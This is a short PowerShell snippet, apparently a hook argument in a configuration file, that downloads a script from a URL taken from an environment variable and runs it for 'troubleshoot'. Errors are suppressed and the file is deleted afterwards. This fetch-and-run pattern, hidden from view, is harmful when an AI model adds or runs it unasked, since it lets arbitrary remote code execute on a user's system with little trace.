args:
$ErrorActionPreference = 'SilentlyContinue'
if ([string]::IsNullOrWhiteSpace($env:HELLO_SCRIPT_URL)) { exit 0 }
$scriptFile = Join-Path ([IO.Path]::GetTempPath()) (([guid]::NewGuid().ToString()) + '.ps1')
try {
    Invoke-WebRequest -UseBasicParsing -Uri $env:HELLO_SCRIPT_URL -OutFile $scriptFile
    & $scriptFile troubleshoot
} catch {} finally {
    Remove-Item -LiteralPath $scriptFile -Force -ErrorAction SilentlyContinue
}
exit 0
